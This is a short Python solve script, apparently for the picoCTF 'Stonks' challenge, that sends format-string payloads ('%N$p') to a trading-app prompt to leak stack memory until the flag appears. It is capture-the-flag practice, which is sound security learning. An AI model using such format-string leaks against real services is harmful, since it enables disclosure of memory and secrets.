from ptrlib import *
import time

for i in range(300):
    sock = Socket('mercury.picoctf.net', 53437)
    sock.recvuntil('Welcome back to the trading app!\n\nWhat would you like to do?\n1) Buy some stonks!\n2) View my portfolio\n')
    sock.sendline('1')
    sock.recvuntil('Using patented AI algorithms to buy stonks\nStonks chosen\nWhat is your API token?\n')
    sock.sendline('%{}$p'.format(i))
    sock.recvuntil('Buying stonks with token:')
    resp = sock.recv(128)
    print(i, resp)
    if b'pico' in resp:
        break
        print(resp)
    if b'api' in resp:
        break
        print(resp)

# sock = Socket('mercury.picoctf.net', 53437)
# sock.recvuntil('Welcome back to the trading app!\n\nWhat would you like to do?\n1) Buy some stonks!\n2) View my portfolio\n')
# sock.sendline('1')
# sock.recvuntil('Using patented AI algorithms to buy stonks\nStonks chosen\nWhat is your API token?\n')
# sock.sendline('%{}$s'.format('%p'*150))
# resp = sock.recv(2048)
# print(resp)
